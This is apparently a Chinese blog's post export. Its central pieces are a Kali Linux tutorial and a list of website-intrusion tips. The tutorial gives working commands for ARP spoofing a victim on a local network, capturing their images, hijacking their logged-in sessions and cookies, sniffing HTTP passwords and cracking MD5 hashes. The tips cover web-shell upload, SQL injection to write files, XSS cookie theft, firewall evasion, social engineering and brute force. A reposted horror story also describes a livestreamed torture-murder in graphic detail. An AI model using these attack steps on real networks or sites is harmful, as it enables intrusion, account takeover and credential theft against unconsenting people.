理，使肉眼觉得画面“好看”了，一个NB的压制者可以把观感提升50%甚至100%。 主要讨论的软件——小丸工具箱，确切来说它是种“壳”，俗称GUI（比如MeGUI）。H.264是种编码类型，而x264是款程序，也是压制软件的核心，给这个核心套上“壳”就成了这些不同的GUI，比如小丸工具箱、MeGui、MediaCoder。至于其他诸如格式工厂、暴风转码、狸窝等各种国产转码软件，没用过几个也不想再去用。 2.对于剧场版蓝光手绘动漫——&gt;1080P，一律给16。鼠绘且无噪点给18。720P再降2。 对于一集一集的动画剧集蓝光——&gt;1080P，特别有爱的，给16，比较爱的给18。720P再降2。 DVD upscale——&gt;一律16 3.动画 CRF 16是实际画质无损值 CRF 18是理论无损值 CRF 20是高质量值（线条可能会花） CRF 22是中等质量值（不适合收藏了） CRF 24是A、B站值。。。 据我所知，80%的PT站电影压制组都是用2pass（码率控制），而不是crf（质量控制）。 且不说哪个好哪个坏，就说压制耗时来讲，crf完爆2pass啊有木有，对于最求发布速度的电影组来说，这可是相当重要的一环啊！如果说是怕控制不住体积，那我倒是理解，但是对于压制发布了成百上千电影的电影组来说，这完全通过经验的积累而具有判断力。","categories":[{"name":"技能输出","slug":"技能输出","permalink":"https://steinsgate.link/categories/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"技能输出：视频后期","slug":"技能输出：视频后期","permalink":"https://steinsgate.link/tags/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA%EF%BC%9A%E8%A7%86%E9%A2%91%E5%90%8E%E6%9C%9F/"}]},{"title":"kali linux渗透系列教程「停更」","slug":"20161202","date":"2016-12-02T06:15:03.000Z","updated":"2019-11-14T07:56:48.000Z","comments":true,"path":"2016/12/02/20161202/","link":"","permalink":"https://steinsgate.link/2016/12/02/20161202/","excerpt":"Kali Linux 业界领先的渗透测试系统","text":"Kali Linux 业界领先的渗透测试系统教程每期都得看，一环套一环，一节看不懂你后面都都看不懂。 ARP断网攻击（1）1.收集目标ip：可以查看网络是否正常 收集目标ip 网关 （同区域网网关一样）网卡 1终端键入：ping www.baidu.com 2.目标ip查询 1终端键入：nmap -sP 192.168.0.* 代码含义：意思是在网络寻找所有在线主机。后面的ip复制你要攻击的目标ip即可。 3.网关获取 #在同一局域网内网关是一样，在本机cmd命令键入ipconfig即可查看 1终端键入：ifconfig代码含义：查看网卡科普命令：clear #代码含义：清空当前页面 4.arp攻击命令 1终端键入：arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 代码含义：arpspoof -i（arp攻击命令）eth0 -t(网卡) 192.168.1.100（目标ip） 192.168.1.1（网关）功能操作：按ctrl键+c，可以停止arp攻击 指定获取内网其它电脑相册（2）到的工具drifthnet 1.流量转发 1终端键入：echo 1 &gt;/proc/sys/net/ipv4/ip_forward #代码含义：流量转发命令，使目标在被arp攻击时也能上网 2.对目标进行ARP攻击 1终端键入：arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 代码含义：arpspoof -i（arp攻击命令）eth0 -t(网卡) 192.168.1.100（目标ip） 192.168.1.1（网关） 3.劫持目标电脑，正在浏览的图片 1新建终端输入：driftnet -i eth0 代码含义：目标机所浏览的图片会全部显示在里面 eth0是网卡 会话劫持（3）效果：劫持局域网内目标ip所浏览的网页。例如：目标登陆了新浪微博，那么我们劫持之后就可以登陆他的新浪微博就是抓取Cookies 。用到的工具： arpspoof wireshark hamster不同的是我们需要在攻击他的时候让他上网，那么就需要转发一下流量： 收集信息 # ip 网关网卡 1终端键入：echo 1 &gt;/proc/sys/net/ipv4/ip_forward # 代码含义：流量转发命令arp攻击目标（不会的去看 1.ARP断网攻击） 然后新建一个终端 1终端键入：输入wireshark 代码含义：wireshark是一个抓包工具 在wireshark内选择网卡点击开始，等2分钟后点击红色方块暂停点击File—-Save As… #保存到桌面 保存为 .pcap格式 暂停arp攻击 #如何暂停看1.ARP断网攻击在终端输入：ferret -r 222.pcap #222.pcapng是你保存到桌面的那个文件名 你们输入的啥就填啥终端输入：ls终端输入：cd 桌面终端输入：ferret -t 222.pcap终端输入：ferret -r 222.pcap桌面生成了一个txt文档打开会发现有很多目标ip网站地址，将txt文档移到kali—计算机—–root文件夹下终端输入：hamster现在修改浏览器ip和端口点击左边工具栏第一个图标像小熊进到浏览器找到最右边菜单点击—–点击齿轮那个图标—–点击Advanced—–Network—–settings…—–选择最后一个Manual…..—–填HTTP Proxy为127.0.0.1—-后面的prot填1234—-点击OK—– #3段横杠图标（有点电脑基础的都知道是设置吧） 在浏览器地址栏输入：127.0.0.1:1234 #127.0.0.1是前面设置的代理 1234是前面设置的端口打开后会看到目标ip我们点击 右边就出现了一堆网站 这些就是目标浏览的网站我们已经成功劫持随便点击去看吧QWQ 备注：有些人会发现打开好多网站都进不去 那是因为你抓包的时候没抓完就暂停导出弄来用了 最好抓个5分钟再暂停导出用 内网获取指定IP的HTTP帐号密码（4）用到的工具ettercapHTTP是什么我就不多说了1. 首先ARP欺骗 1终端键入：echo 1 &gt;/proc/sys/net/ipv4/ip_forward 1终端键入：cat /proc/sys/net/ipv4/ip_forward ARP攻击 1bash终端键入：arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 代码含义：arpspoof -i（arp攻击命令）eth0 -t(网卡) 192.168.1.100（目标ip） 192.168.1.1（网关） 1新建终端键入：ettercap -Tq -i eth0 代码解释：-Tq也可以使用另一种方式 -T -q意思是启用文本模式来回显 eth0是网卡 利用findmyhash高效破解MD5加密密码（5）用到的工具findmyhash 1终端输入：findmyhash MD5 -h 202cb962ac59075b964b07152d234b70 代码作用：这个工具会调用一些破解MD5网站来破解，一个一个找网站破解多麻烦对吧QwQ 202cb962ac59075b964b07152d234b70这个就是MD5加密的密码 服务器枚举工具Amap的使用（6）软件介绍：Amap是一个服务器枚举工具，使用这个工具可以识别正运行在一个指定端口或一个范围端口上的应用程序我就拿本机ip测试了1. 查看ip 1在cmd键入ipconfig IP:192.168.1.100到kali系统测试在这里我演示在指定的在制定的50到200端口范围内，运行在192.168.1.110这个ip上面正在运行的 1终端键入：amap -bq 192.168.1.110 1-1000 有些人会发现回复了 1root@kali: amap -bq 192.168.1.100 1-1000 amap v5.4 (http://www.thc.org/thc-amap) started at 2015-09-05 13:28:34 - APPLICATION MAPPING mode 这个样子就是你端口设置范围太小 我们设置大一些就行 1Protocol on 192.167.1.110/tcp matches netbios-session - banner: 代码作用：后面显示banner就是没软件运行，如果有显示一些程序名那就是运行的软件了 Recon-NG框架的介绍（7-上）软件介绍：Recon-NG是由Python编写的一个开源web侦查（信息收集框架）首次使用Recon-NG 12执行命令：recon-ng[default] &gt; 看到这个就说明我们成功登陆了recon-ng框架 下面我们使用help命令查看所有的执行命令 1终端键入：help [71] Recon modules #侦查模块[7] Reporting modules #报告模块[2] Import modules #渗透攻击模块[2] Exploitation modules #发现模块[2] Discovery modules #导入模块add Adds records to the database # 添加到数据库中添加记录back Exits the current context #返回当前上下文delete Deletes records from the database #删除从数据库中删除记录exit Exits the framework #退出退出框架help Displays this menu #帮助显示此菜单keys Manages framework API keys #密钥管理框架load Loads specified module #指定模块pdb Starts a Python Debugger session #PDB启动Python调试器会话query Queries the database #查询数据库record Records commands to a resource file #记录到资源文件的命令reload Reloads all modules #重新加载所有模块resource Executes commands from a resource file #资源从资源文件中执行命令search Searches available modules #搜索可用模块set Sets module options #设置模块选项shell Executes shell commands #外壳执行外壳命令show Shows various framework items #显示各种框架项目snapshots Manages workspace snapshots #快照管理工作区快照spool Spools output to a file #阀芯轴输出到文件unset Unsets module options #未设定模块选项use Loads specified module #使用指定模块workspaces Manages workspaces #工作区管理工作区上面这些都是在recon-ng内使用的参数可以使用show modules查看所有有效的模板列表 #输入后看到的5类就是上面说到的侦查模块，报告模块，渗透攻击模块，发现模块，导入模块。 利用Recon-NG框架检测baidu所有子域（7-下）如果你入侵一个网站，入侵不进去，收集这些子站的信息可以入侵，然后进行跨站或者社工之类的操作。1. 使用recon&#x2F;domains-hosts&#x2F;baidu_site模板 1终端输入：use recon/domains-hosts/baidu_site 1show options 代码功能：查看该模板下可配置的参数 1终端输入：set SOURCE baidu.com 1终端输入：run 代码作用：输入完可以看到它在慢慢举例，等举例完了，就可以使用终端输入 位置&#x2F;test.txt 保存 #位置填要保存的位置例如桌面 域名查询工具DMitry的使用（8）工具介绍：使用域名查询工具DMitry，可以用来查询ip，域名，whios信息盘测试网站：http://www.bilibili.com 1终端输入：dmitry -wnpb bilibili.com Referral URL: http://www.name.com #这个就是B站的注册商Name Server: NS1.HDSLB.NET #这个是B站所用的DNSCreation Date: 21-oct-2004 #这个是域名注册时间Expiration Date: 21-oct-2020 #这个是域名到期时间剩下的用谷歌翻译看就知道我就不一一解说了","categories":[{"name":"技能输出","slug":"技能输出","permalink":"https://steinsgate.link/categories/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"IT：渗透测试","slug":"IT：渗透测试","permalink":"https://steinsgate.link/tags/IT%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IT","slug":"IT","permalink":"https://steinsgate.link/tags/IT/"},{"name":"IT：Linux","slug":"IT：Linux","permalink":"https://steinsgate.link/tags/IT%EF%BC%9ALinux/"}]},{"title":"「Shadow Web」","slug":"20161201","date":"2016-11-30T16:00:00.000Z","updated":"2019-11-14T04:12:56.000Z","comments":true,"path":"2016/12/01/20161201/","link":"","permalink":"https://steinsgate.link/2016/12/01/20161201/","excerpt":"广为流传的都市传说","text":"广为流传的都市传说恐惧鸟 作为「Deep Web之旅」的第一篇，笔者今天在和大家分享一个网友因太过沉默于「暗黑网络」而遇到的可怕经历…. 在故事开始之始，让笔者先说明一下「Deep Web」和「Shadow Web」的分别。「Deep Web 」中文名叫暗黑网络、隐形网络或深层网络。它泛指一些不能由传统搜寻器找到的网站。这些隐藏的网站须通过动态请求才可进入，或由特定的搜寻器(例如TOR browser)才可以找到。据非正式统计，暗黑网络占网络全部信息的90%有多。 但是，正由于其隐蔽性质，有不少非法网站都藏匿在这个「暗黑网络」之中，例如毒品交易、儿童色情、人口贩卖等。这些数以千计的非法网站充斥在「暗黑网络」，令到人们对「暗黑网络」的印象就好像电影「罪恶城」里头的老城般，生人勿近。 那么「Shadow Web(影子网络)」又是什么来﹖ 在电脑学上，「影子网络」的网络结构上和「暗黑网络」一模一样，也算是「暗黑网络」的一种。但在字面意思上，「影子网络」是指那些比「暗黑网络」还深入、更病态的网站，里头变态的内容即使是毒品头子或恋童魔也会捏一把冷汗。 其实「Shadow Web(影子网络)」这个词语是今年年初才出现，而这个词语的起源是来自Reddit(类似香港高登论坛)的帖子，这也是笔者今天要和大家介绍的故事…… 一个可怕的警告 在2014年2月，一名叫keniluck的网民在Reddit发布了一个叫「a warning to those thinking about accessing the shadow web( 一个给那些试图进入影子网络的警告)」的帖子，内容是讲述他在一次偶尔的机会下，进入了一个叫「影子网络」的世界，之后发生了一连串可怕的事情…. 其实我们是不是真的熟悉我们每天接触的网络世界﹖ 在两星期前，我一定会笃定地答你「是」，因为我以前一直认为自己是个「网络老手」。毕竟，我在Fortune City和IRC channels 97年刚刚成立时，便已经是它们的资深会员。之后由2008年开始，我几乎每天都花12个小时在Reddit和4chan，而且不会放过浏览任何一张最新最红的Memes。 直到我在两星期前上过「影子网络」后，便发现自己其实由如至终都不曾熟悉整个网络世界，甚至不熟悉整个人类世界…. 大约一年前，有人向我介绍一种叫「Shadow Web(影子网络)」的东西—一些埋藏在网络最深层的网站，一些正规搜寻引擎不会找到的网站。虽然也有人曾经对我说过，即使「影子网络」也不算是最深层，但那些不在我们这次讨论范围内。简单来说，影子网络就是一些没有任何「超连结」可以经由「表网络」进入到的网站，而且那些网站里头的内容也不是那些普通的尸体照片或人兽杂交。我已经深入探索过「影子网络」，我可以向大家担保，里头的东西的恐怖程度远超乎你们想像范围之外… 其实我从来没有问过那个男人的姓名。他是我以前在一间加油站打工时的熟客。每一次他来到加油站，都会购买$20到$50不等的UKASH凭证(一种类似Paypal的网络贷币)。我一直以为他用那些钱来买线上色情片，因为他那微秃的头顶和米色的Polo Shirt，简直就是对人说「我是色情狂」的意义。 直到有一日，他突然一口气买了$300 UKASH凭证。那一刻，我问了一条令我后悔一生的问题，我问他：「你要增值那么多钱来买什么﹖」 「你有没有听过影子网络﹖」他漫不经心地说，一边拿出15张$20纸币。 我摇头，因为那时候我真的没有听过。 听过我的答案后，他用一种古怪的眼神打量了我一会儿，仿佛在计算什么东西。之后，他由钱包拿出一张信用卡大小的卡片，鬼祟地塞进我的手里，仿佛是某间妓院的卡片。 「如果你想知道，就自己把答案找出来。」 那个男人说完便离开，之后我再也没有见到他了。 不久，我辞去了油站的工作，回到大学读书。有一天，我无意中在裤袋里找回那张卡片。这时候，我再仔细阅读上面密密麻麻的文字，发现那些文字是教导如何通过「影子网络」的「闸门」。那些步骤非常繁复，还有些是几深奥。可惜的是，这些困难反而激起了我这个网络发烧友的好奇心，我决定闯入这个神秘的「影子网络」一看究竟。 关于「影子网络」，第一样你要知道的事情是，你绝对不会想去那里。我也在「表网络」浏览过一些血腥恐怖的网站，但没有一个比得上「影子网络」里头任何一个网站。现在回想起来，其实我进入「闸门」那一刻，便应该立即回头，但可惜我没有那样做。 「影子网络的闸门」是一个类似你在飞机场用Free Wifi时那些登入首页。当我登入后，看到里头有很多分类索引。第一个引起我注意的是Corpsefucking (又译奸尸、恋尸、屌尸)，下面竟然有三十个以奸尸为主题的网站！「剥皮」、「肢解」这些索引也有很多网站，证明这些主题在这个「影子网络」也颇受欢迎。 其实除了色情和血腥外，这个「影子网络」还有许多索引，但全都离不开杀人越货的事情。例如有个网站教你如何DIY炸弹，也有个吃人肉癖和被吃癖的人的另类「征友网站」，还有一些贩卖假身分证的黑市。 我在一个叫「avenge.shweb」的网站逗留了一个小时有多，里头是一些政府机密文件和战时外交文件。那个网站的设计很「复古」，希望你明白我的意思啦。当我发现自己面对那些奇怪标题的超连结，想也不想便按入去时，我便知道自己已经熟悉了这个「影子网络」。 至少暂时如此。 事先声明，我一定不会和你们说出以下提到的网站的位置或名称。当你看过以下的内容，你就会明白我这样做纯粹保护你们和一些无辜的女人。因为我明白人的好奇心是怎样一回事，我知道我说出来后，一定有不少找死的小朋友不顾后果地找那个网站，而我绝对不想让这种事情发生。 我是在偶尔的情况下发现「那个网站」。「那个网站」是一个网上直播真人show(类似我们的JTV)，观赏是免费的，左侧还有个公众聊天室，观众可以留言说话。除此之外，画面下面有个「UKASH按钮」，在某些情况下可用来给钱网站的主人。网站要先登入才可以看到影片和聊天室内容。我当时以为是什么畸形性爱真人SHOW(乱伦、人兽)，心想都没有什么大不了，所以想也不想便开了一个新帐户，登入去看看。 当我登入之后，数以百计的留言便立即弹出来，那些留言主要是英文，但也有些日文和法文，甚至连阿拉伯文也有。最初，「那个网站」的观众大约只有150人，不久便增加到200。大部份留言内容都是一些催促性句子，例如「开始了吗?」，「GOGOGOGOGO~」等等。 大约数分钟后，镜头突然出现一个戴着曲棍球面具的男人。那个男人有深棕色的皮肤，而且瘦骨嶙峋，让人联想起埃塞俄比亚那些挨饿的非洲人。此时，网站的管理员把聊天室的功能关上，对话框只余下一位叫italiangoat(意大利山羊)的会员能够发言，还真是个古里古怪的名字。 突然，镜头传出一把女人的尖叫声 镜头照映出一间阴暗的房间，一名女子坐在房间的中央。她的双眼被人用黑布蒙上，手脚被蟒蛇般粗大的绳子紧紧缠绕住，被绑在一张破烂的木椅上。那个戴上曲棍球面具的男人则站在女人的旁边。他的旁边还有另一个皮肤黝黑的男人，很难说出他的国籍，他非常壮硕，有军人的身形和屠夫的冷酷眼神。他一手紧紧揪住那个女人的长发，不让她逃走。那个女人不断扭动身体，试图脱开身上的绳子。但这些挣扎都是徒劳，那些绳子实在太紧，反而在她的身上留下一条条深红瘀痕，天知道她像这样被人绑了有多久﹗ 最后，那个个戴上曲棍球面具的男人把女人的眼罩撕下来，女人的尖叫声也猛停下来。那个女人用不敢相信的眼神环顾四周，仿佛不知道自己为什么在这儿。但当她看到面前的摄影机时，瞳孔立即因恐惧急剧缩小，并开始轻声啜泣起来，仿佛意识到接下来发生的事情。虽然我听不懂她在说什么话，应该是阿拉伯话，但由她的绝望的样子便猜到她在哀求那个男人，希望他们放过她。 此时，对话框弹出Italiangoat第一则讯息。 Italiangoat：把她打侧躺在地上 他们的流程大约如下：每当会员Italiangoat落下一道命令，那个曲棍球面具男人便会把讯息翻译成另一个健壮男人的母语，之后那个壮硕男人便会立即执行。 Italiangoat:踢落她的肚子 壮硕男人毫不犹豫，立即狠狠一脚踢落女人的肚子，女人样子痛苦地捂住肚子，仿佛要呕吐起来。 Italiangoat: :踢落她的脸上 女人的孔脸立即被踢得扁平，鼻梁应声断裂，发出清晰的咔一声，鲜血立即由鼻孔流出。 Italiangoat: 踢落她的胸膛 女人的胸腔立即被男人踢得沉闷的砰砰声。我用难以置信的目光瞪着萤幕里疯狂的景象，视线久久不能转移。我有想过打电话报警，但整个人仿佛被吓得石化，四肢像岩石般沉重，还是我被那个女人吸引了﹖ Italiangoat: 和你的朋友说踢得凶狠些，我可是给了你们很多钱。 收到命令后，那个黝黑男人立即加把劲地在女人的身上乱踢乱蹬，那个女人在地上不停地尖叫，翻滚身体，但这些动作丝毫没有令到踢她的男人慢下来，仿佛她只不过是屠宰场里的一头猪，而不是一个有血有肉的女人。 Italiangoat: 现在和我割开她的喉咙 当我看到这段讯息，我在电脑面前尖叫了出来，胃子揪成一团，心脏跳得像失控的免子。我尝试打一些讯息给管理员，但全部都毫无回音。那个女人听到曲棍球面具男人的转述后，立即发出凄厉的尖叫。 Italiangoat: 等一下！收回！收回命令！ 黝黑男子立即放下抵在女子颈下的利刀，等待新的指示。我看到那个会员收回命令，立即松一口气，认为他只不过是恫吓那个女人。但Italiangoat很快下一则新的命令，而这个命令瞬间摧毁了我前一刻任何天真的幻想。 Italiangoat: 先挖了她的眼珠出来 那个曲棍球面具男人瞪着萤幕好一会儿，眼睛看不清是冷酷的计算还是慈悲的犹豫，他很快就回覆给Italiangoat一个简洁而战栗的讯息。直到现在，每当我想起那个讯息，也会感到毛骨悚然。 Admin(管理员): 要多给$500 看到讯息后，我的脑袋突然变得空白一片，心想着$500这个价码。$500﹖ 一个女子的生命只值$500﹖ $500就可以把一个无辜女人折磨得半死不活﹖ $500就可以决定一个女人的生死﹖ 我有想过立即出更高的价码把女人救出来，但可惜我当时真的无能为力，我只是一个在加油站打工的年轻人，银行户口甚至$300也没有，更不用说$500。我只能眼白白看着眼前这个无辜的女人，被那些变态的有钱人在死前玩弄得不成人形。 Italiangoat: OK. 一把凄厉的惨叫立即由萤幕传出来，那是我有生以来听过最凄厉的惨叫声。我想把网站关上，但我的胃子抢先一步，把我拉入厕所吐起来。我几乎把两天份量的食物全都呕吐了出来，那个女人的尖叫仍然由电脑不传出，在整栋房子回响，仿佛就在我的房间被杀。 即使我把黄胆水都吐了出来，我仍然瑟缩在厕所内，不敢回到房间。我以前也有看过很多杀人的影片，但我可以向你们保证，你亲眼目睹一个活生生的女人被折磨至死，和看那些杀人影片，是两码子回事来的。 直到那女人的叫声完全停顿下来，我才由厕所颓然地走回房间。当我回到房间时，我看到我这辈子最不想看到的一个画面。 那个女人的脸被凑近在镜头面前，可以清楚看到她破裂的牙齿、裂开的鼻子、碎裂的下巴，还有被割开的喉咙。但最可怕的地方是那双血窝，那些原本是眼珠的地方，现在变成两个深不见底的血窝，鲜血不断流出，宛如泪水般流过脸颊，流下两道深红色的泪痕。空洞的眼窝怔怔地瞪着镜头，仿佛在怪责所有人，怪责所有袖手旁观的观众。 我杀了那个女人，这是我第一个闪过的念头。无论是直接或间接，我都和那个可怜的女人的死有点责任。这个想法实在太沉重，我用最快的速度冲到电脑前，手忙脚乱地拔去电源，并决心不再上这个该死的「影子网络」。就在萤幕转黑前那一刻，我看见那个管理员的下一则讯息，那则讯息是整件事最恐怖的地方，那则使我整个月也无法安眠的讯息。 Admin：多谢你们的观赏！下一场表现会是一个小时后！记得留意！ 笔者按：如果这个故事只有以上楼主的自言自语，无图无片，那么它只不过是一个「故事」罢了，但其实这个「故事」才刚刚开始，更可怕的事情还在后头… .究竟之后发生了什么事，让网民开始相信楼主所言不虚呢？究竟这个Shadow Web还隐藏了什么呢？究竟楼主的最后下场如何？这就要留意下一回啦 (下图纯粹是人们声称由Deep Web打捞上来的照片，不一定和楼主的故事有关)","categories":[{"name":"转载","slug":"转载","permalink":"https://steinsgate.link/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"转载","slug":"转载","permalink":"https://steinsgate.link/tags/%E8%BD%AC%E8%BD%BD/"}]},{"title":"【科普向】看看网警监控如何找到你","slug":"20161107","date":"2016-11-07T06:15:03.000Z","updated":"2019-11-14T07:29:36.000Z","comments":true,"path":"2016/11/07/20161107/","link":"","permalink":"https://steinsgate.link/2016/11/07/20161107/","excerpt":"安全意识的培养！","text":"安全意识的培养！ 大致分为下列几种情况： 不用代理 网民发帖流程： 发帖人 → ISP → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 发帖人IP → 发帖人ISP → 档案 爆菊几率：100% 只用1层私人VPN 网民发帖流程： 发帖人 → ISP → VPN → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → VPN的IP → 路由日志 → 链接者IP → 链接者ISP → 办网档案 爆菊几率：100% 用1层共用VPN 网民发帖流程： 发帖人 → ISP → VPN → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → VPN的IP → 入侵VPN服务器 → 日志 → 链接者IP → 链接者ISP → 办网档案 爆菊几率：80% 用2层私人VPN 网民发帖流程： 发帖人 → ISP → VPN1 → VPN2 → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → VPN2的IP → 入侵VPN2服务器 → 日志查VPN1 → 路由日志 → 链接者IP → 链接者ISP → 办网档案 爆菊几率：40% 用2层共用VPN 网民发帖流程： 发帖人 → ISP → VPN1 → VPN2 → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → VPN2的IP → 入侵VPN2服务器 → 日志查VPN1 → 日志 → 链接者IP → 链接者ISP → 办网档案 爆菊几率：25% 用N层私人（共用）VPN后删掉VPN，如果发帖人有QQ 网民发帖流程： 发帖人 → ISP → VPN1 → VPN2 → VPN3 → VPN*n服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 访问网站 → 发帖人常用用户名 → 谷歌（百度）一下 → 查到QQ → 找企鹅公司查近期登录IP 爆菊几率：100% 用N层私人（共用）VPN后删掉VPN，如果发帖人无QQ 网民发帖流程： 发帖人 → ISP → VPN1 → VPN2 → VPN3 → VPN*n服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 访问网站 → 发帖人常用用户名 → 谷歌（百度）一下 → 查到其他论坛注册的ID → 找管理员查注册（登录）IP 爆菊几率：100% 用N层私人（共用）VPN后删掉VPN，如果发帖人再网上没有任何信息 网民发帖流程： 发帖人 → ISP → VPN1 → VPN2 → VPN3 → VPN*n服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 访问网站 → 无常用用户名 → 根据发帖内容（如北京市海淀区XX小区） → 监控整个小区宽带 → 分析 → 找到IP 爆菊几率：80%（如果不是严重的问题，如判国之类的应该不会用这种蛋疼方法） 用N层私人（共用）VPN后删掉VPN，如果发帖人再网上没有任何信息，但电脑上有自动链接网络的软件，如QQ，金山快盘等。。 网民发帖流程： 发帖人 → ISP → VPN1 → VPN2 → VPN3 → VPN*n服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 访问网站 → 无常用用户名 → 各大公司查IP → 查到常用用户名 → 查历史登录记录 → 查ip → 爆菊 爆菊几率：100% 到KFC之类的地方上公共网。 网民发帖流程： 发帖人 → KFC → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 访问网站 → 看发帖日期时间 → 到KFC → 调监控 → 爆菊 爆菊几率：100% 到KFC之类的地方上公共网，假设本次没被监控拍到 网民发帖流程： 发帖人 → KFC → 服务器托管商 → 服务器 网警追踪流程： 网监 → 服务器IP → 访问网站 → 看发帖日期时间 → 到KFC → 查MAC地址 → 到附近其他公共网络查此MAC → (如果DHCP会查计算机名) → 附近监控 → 爆菊 爆菊几率：100% 12.1 假设自己买的电脑 查MAC数据库能找到销售商。。一般买电脑的时候MAC也有记录。。可能是三包凭证之类的都有。。而一般买电脑会让你提供个人信息填写三包，MAC之类的硬件代码也会记录。。之后你懂的，不过有些商家对这个不怎么记录。不过也有可能查购买者银行卡（如果非现金）。所以..爆菊几率&lt;25% 12.2 假设是线下二手交易 同样，查到电脑原主人，问问就知道了。。不过一般交易者都会留下你的手机号之类的，到移动联通电信之类的查查就知道了。。如果非实名卡查查基站，能查到IMEI，如果不是山寨机同样有方法查到买手机的人，所以我感觉这样反而没到小地方买电脑的方法保险。。爆菊几率&lt;75% 知道地区了。。 查所有与1723交换记录（openvpn蛋疼）。。查链接时间，你懂的。。","categories":[{"name":"技能输出","slug":"技能输出","permalink":"https://steinsgate.link/categories/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"IT","slug":"IT","permalink":"https://steinsgate.link/tags/IT/"},{"name":"IT：信息安全","slug":"IT：信息安全","permalink":"https://steinsgate.link/tags/IT%EF%BC%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}]},{"title":"大佬们的网站渗透思路","slug":"20161002","date":"2016-10-01T16:00:00.000Z","updated":"2023-03-15T04:19:08.000Z","comments":true,"path":"2016/10/02/20161002/","link":"","permalink":"https://steinsgate.link/2016/10/02/20161002/","excerpt":"分享有价值的思路","text":"分享有价值的思路 OldJun总结1.无论什么站，无论什么语言，我要渗透，第一件事就是扫目录，最好一下扫出个上传点，直接上传shell，诸位不要笑，有时候你花很久搞一个站，最后发现有个现成的上传点，而且很容易猜到，不过这种情况发生在asp居多！ 2.asp（aspx）+MSSQL先考虑注入，一般的注入都有DBowner权限可以直接写shell；如果写不了，或者web与数据库分离，那就猜数据，从后台下手了，后台可以上传或者改配置文件； 3.asp（aspx）+ACCESS拿shell一般只有3种方法，一是前台上传或者注入进后台上传；二是注入进后台改配置文件；三是注入进后台备份数据库或者暴库后知道是asp或者asa数据库于是直接写一句话； 4.php+MYSQL 一般是注入进后台上传，偶尔运气好些权限够高可以注入select into outfile；然后包含，分本地与远程，远程包含在高版本php是不支持的，于是想办法本地上传图片文件或者写到log里；然后php程序某某未公开的 漏洞，运气好可以直接写shell。 者写到log里；然后php程序某某未公开的 漏洞，运气好可以直接写shell。 5.jsp+MYSQL利用数据库拿权限方面基本同php，而且jsp的上传基本很少检查文件后缀，于是只要有注入点与后台，拿shell相当的容易。jsp+ORACLE的站我碰到的不多，碰到的也是猜出用户名与密码从后台下手的。 6.无论什么大站，主站一般都很安全（不然早被人玩了），于是一般从二级域名下手，猜出主站的某些用户名与密码或者搞到主站的源代码，或者旁注得到同网段服务器后cain或arp。 7.一般的大站很少有用现成的CMS的，于是如果你有幸找到源码，那你就发了，注入漏洞啊，上传漏洞啊，写文件漏洞啊，都掌握在你手里。多看看那些大站新出来的测试分站点，那些站还在测试中，可以很轻松拿下。 8.上传有个文件名截断，这包括2个方面，一是00截断，二是长文件名截断（曾经利用这个搞下hw）；然后很多写文件的地方，都可以00，屡试不爽。上传别忘了.asp（当然.asa，.cer，.cdx都可以啦）目录的妙用。 9.php 站无论windows还是linux，都有magic_quotes_gpc的问题，magic_quotes_gpc为on的时候，在server变量 注入的时候还是可以select into outfile，今年我搞过某未开源cms就是这个情况，一般情况下为on就别考虑写文件了，不过有这个权限别忘了读文件源码，因为load_file的 参数是可以编码的。 10.猜路径或者文件在**中非常必要，猜不到路径的时候别忘了google（baidu太烂，google很全），于是你可以考虑看站点下的robot.txt或者robots.txt，会有惊喜。 11.工具的使用很重要，入侵之前用WVS扫扫会有助入侵；注入工具虽然很多，但不见得都好使，现在的软硬防火墙、防注入越来越厉害，那时候你就别偷懒，多手工有助你成长。 12.遇到过一流监控么，遇到其他防post的防火墙么，有时候一句话进去了都无法传大马，那时候，你先学学编码，学学变换绕过。 13.想搞一般的小站，记得查看这个小站的版权，找做这个站的公司，然后从这个公司做的其他站下手，得到源码再回头搞，我曾经通过这个方法拿下某知名制药的公司站。 14.旁注的思路永远不过时，遇到dbowner的注入，可以很舒服写shell到你需要的站，省得麻烦的提权了；运气不好，按部就班拿shell提权得到你所需。 15.永远别忘记社会工程学，利用社工把自己当成一个什么也不会的人，从某某站长的qq，身份证，邮箱等等下手，也许有时可能会有意外；另外别忘记admin,admin；test,test；123456,123456这种简单的尝试，当然，你也可以暴力破解。 16.别忽视XSS，别忽视cookie，XSS可以偷cookie，更有若干妙用，自己学会领悟；cookie可以伪造登陆，cookie可以注入，cookie注入可以绕绝大多数的防火墙。 17.平时搞站多多搜集路径啊，源码啊，工具啊，充实自己的“武器”库；最好把自己的入侵步骤记录下来，或者事后反思下，我一般都是记在txt里，另外要做到举一反三。 18.多学习，多看源码，多看公布出来的0day，脚本是入侵的前提，而不是工具，会用工具会装B你还没入门。 XXbing总结:目标：www.***.com |–探测开放的服务 溢出 弱口令 分析网站目录结构 整站程序Bug 黑白盒测试 获取SHELL nslookup 列出所有二级玉米 逐个分析 探测弱口令 注入 注入 嗅探+arp 收集一切能收集管理员信息 充分应用baidu google 实现社会工程序 冰的原点总结：1、pangloin对oracle注入点的误报率偏高！ 2、SQL语句有时候虽然暴错，我们的语句也有可能成功了！ 0判断权限不准确； 4、在PCANYWHERE提权的时候常碰到连上去还要输入WIN密码，网上流传的方法操作起来不切实际，其实连上去就等于拿到系统权限了，大家自己研究，这里提一下； 5、oracle注入不支持多句执行，如update等语句； 